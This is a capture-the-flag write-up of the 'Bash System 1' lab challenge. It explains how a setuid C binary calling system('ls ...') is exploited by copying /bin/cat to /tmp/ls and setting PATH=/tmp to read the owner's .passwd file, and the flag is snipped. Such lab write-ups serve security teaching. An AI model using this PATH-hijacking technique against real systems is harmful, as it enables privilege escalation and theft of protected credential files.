# Bash System 1 - Writeup

We have this script
```c
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
 
int main(void)
{
    setreuid(geteuid(), geteuid());
    system("ls /challenge/app-script/ch11/.passwd");
    return 0;
}

```
With a `ll`, we can also see that we execute this script with the owner's rights, being 'app-script-ch11-cracked', the same owner as '.passwd'
```bash
app-script-ch11@challenge02:~$ ll
-r-sr-x---  1 app-script-ch11-cracked app-script-ch11 7252 May 19  2019 ch11*
```
Which means that everything being done in the script is executed "by the owner".

But we don't want to `ls .passwd`, we want to see what's inside, by using `cat` for example.

So we want to use `cat` instead of `ls` in the script.

One way to do it is to copy the cat executable and rename it 'ls', then changing our `$PATH` to the directory that contains ou new cat executable.
```bash
app-script-ch11@challenge02:~$ cp /bin/cat /tmp/ls

app-script-ch11@challenge02:~$ PATH=/tmp
```

Then we can execute the script, which will cat the password for us
```bash
app-script-ch11@challenge02:~$ ./ch11
!oPe[... flag snipped ...]5
```